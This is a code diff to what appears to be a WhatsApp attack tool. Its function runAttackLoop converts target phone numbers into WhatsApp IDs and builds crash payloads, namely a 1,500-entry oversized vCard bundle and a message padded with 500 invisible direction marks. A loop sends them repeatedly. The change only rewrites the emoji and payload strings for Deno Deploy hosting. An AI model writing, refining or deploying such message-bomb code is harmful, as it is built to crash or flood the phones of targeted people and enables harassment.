@@ -210,17 +210,19 @@ async function runAttackLoop(socket, rawTargets) {
     isAttacking = true;
     const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
     
-    // Payloads
+    // Payloads (UNICODE SAFE FOR DENO DEPLOY)
+    const fireEmoji = "\\uD83D\\uDD25";
+    const skullEmoji = "\\u2620\\uFE0F";
+    const bombEmoji = "\\uD83D\\uDCA3";
+    const invisibleChar = "\\u200e\\u200f";
+
     let heavyVcardContent = '';
-    for(let i=0; i<1500; i++) heavyVcardContent += 'BEGIN:VCARD
-VERSION:3.0
-FN:' + '🔥'.repeat(10) + 'OVERLOAD_' + i + '
-TEL;type=CELL;waid=0:0
-END:VCARD
-';
+    for(let i=0; i<1500; i++) {
+        heavyVcardContent += 'BEGIN:VCARD\nVERSION:3.0\nFN:' + fireEmoji.repeat(10) + 'OVERLOAD_' + i + '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
+    }
     
-    const vcardPayload = { contacts: { displayName: '☠️', contacts: [{ vcard: heavyVcardContent }] } };
-    const crashText = "💣" + "\u200e\u200f".repeat(500);
+    const vcardPayload = { contacts: { displayName: skullEmoji, contacts: [{ vcard: heavyVcardContent }] } };
+    const crashText = bombEmoji + invisibleChar.repeat(500);
 
     let counter = 0;
     while(isAttacking) {
